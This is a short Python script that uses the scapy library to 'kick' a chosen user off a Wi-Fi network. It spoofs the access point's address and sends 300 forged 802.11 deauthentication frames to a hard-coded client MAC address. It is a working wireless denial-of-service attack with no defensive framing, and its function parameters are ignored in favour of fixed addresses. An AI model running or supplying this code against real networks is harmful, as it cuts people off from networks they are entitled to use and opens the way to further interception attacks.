'''
Kick desired user
'''
from scapy.all import Dot11, RadioTap, Dot11Deauth, sendp

def kick(ap,target):
    # bssid of desired user to kick
    target_mac = "d6:c9:cb:66:30:62"
    
    # bssid of connected wlan
    gateway_mac = "80:c5:48:55:e4:da"

    dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)

    packet = RadioTap()/dot11/Dot11Deauth(reason=7)
    
    sendp(packet, inter=0.1, count=300, iface = "wlx503eaabb1b5e", verbose=1)

